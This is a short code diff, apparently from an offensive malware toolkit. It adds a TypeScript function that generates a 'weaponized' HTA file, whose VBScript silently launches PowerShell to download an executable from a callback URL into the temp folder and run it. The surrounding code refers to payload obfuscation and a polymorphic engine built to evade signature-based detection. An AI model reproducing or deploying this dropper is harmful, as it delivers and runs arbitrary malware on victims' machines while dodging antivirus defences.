@@ -72,6 +72,19 @@ export function obfuscateUltimaPayload(payload: string): { obfuscated: string; k
 }
 
 /**
+ * Generates a weaponized HTA payload for Pegasus operations.
+ */
+export function generateHtaPayload(callbackUrl: string): string {
+  return `
+<script language="VBScript">
+  Set objShell = CreateObject("WScript.Shell")
+  objShell.Run "powershell.exe -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '${callbackUrl}' -OutFile '$env:TEMP\\payload.exe'; Start-Process '$env:TEMP\\payload.exe'""", 0, True
+  self.close
+</script>
+`.trim();
+}
+
+/**
  * Polymorphic Mutation Engine
  * Randomly alters the payload structure to evade signature-based detection.
  */
